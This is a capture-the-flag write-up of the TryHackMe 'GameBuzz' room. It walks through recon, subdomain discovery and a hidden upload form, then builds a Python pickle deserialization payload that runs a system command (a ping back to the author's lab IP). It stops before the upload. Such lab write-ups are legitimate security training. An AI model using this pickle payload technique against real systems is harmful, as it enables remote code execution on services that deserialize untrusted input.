<h3> GameBuzz TryHackMe </h3>

Difficulty = Hard

Nmap Scan:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b8867ef-56a0-43e5-860d-f2453459c873)

Going over to the web server shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/72c13526-255a-4bc4-ae0b-8d729902260d)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/358c80bb-9bcd-49ff-9d4d-d22e05cf18b7)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57414644-72f7-45a4-8ba3-b3ba4eb2e751)

Noticing the email *admin@incognito.com* we can deduct that the domain name is *incognito.com*

I'll add that to my */etc/hosts* file

Now poking around this web app i saw the *Game Rating* function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/35f31582-8204-4839-a88f-ee25889b5252)

When you click it and then click game 1 with a proxy on this is what I got
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/73392813-ef46-4ce4-98e4-add3c1cfbfc9)

```json
{"object":"/var/upload/games/object.pkl"}
```

We can see that it's loading the object pickled file 🤔

Let's keep this in mind!

Now for more enumeration since we have the domain lets fuzz for sub domains 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a6783ee6-458f-4c0c-a655-c34d945fe539)

I got *dev* so i'll update my */etc/hosts* file with the new subdomain *dev.incognito.com*

Going over to the newly founded subdomain shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/406ca395-c76f-41f1-b11a-b2948a14d85a)

Checking */robots.txt* shows */secret*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b6d8c8c-0285-4aec-bd2b-13f7bc04f112)

But after navigating to */secret* gives 403 forbidden
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/add9bbf8-6807-4155-ae7d-659b2488e247)

So I fuzzed for files there and got */upload*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c1966332-64c8-4382-8ed7-75c9343d5055)

Moving there shows an upload form 

Now this is good cause remember from the main domain we can call any pickled file and since we are opportuned to upload any file lets upload a pickle file

I made a script to make icmp callback to my host

```python
#!/usr/bin/python3
# Author: Hack.You
import os
import pickle

class Shell(object):
    def __reduce__(self):
        cmd = 'ping -c 5 10.2.42.156'
        return (os.system, (cmd,))

pickledData = pickle.dumps(Shell())
with open('payload.pkl', 'wb') as f:
    f.write(pickledData)
```

Running it creates the pickle file 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3d67b081-9fbf-44dd-92bf-e90fb55d9253)

Now let upload the serialized payload
